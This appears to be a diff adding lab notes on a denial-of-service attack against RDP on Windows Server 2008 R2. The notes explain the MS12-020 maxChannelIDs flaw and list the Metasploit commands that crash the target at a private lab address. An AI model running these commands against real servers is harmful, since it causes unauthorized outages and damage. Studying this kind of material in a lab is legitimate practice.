@@ -1,0 +1,21 @@
+# for the prot 3389 rdp is enabled so we can run dos(denial of  service) attack to the target machine
+
+# The flaw exists in the RDP service in mishandling the MCSPDU packet in the maxChannelIDs field, which
+# leads to the usage of an invalid pointer, which created a condition for DOS attack. The hacker can send crafter
+# RDP packets for RDP.
+
+# we can use metasploit for the attack.
+
+# The vulnerability allows remote attackers to engage in DOS attack
+# to which the server 2008R2 is vulnerable through "Terminal Server Denial of Service Vulnerability crafted
+# packets via RDP service. 
+
+search  ms12-020
+
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+
+set RHOSTS 192.168.56.3
+
+run
+
+# this will make the server to restart itself this will cause damages to the server.
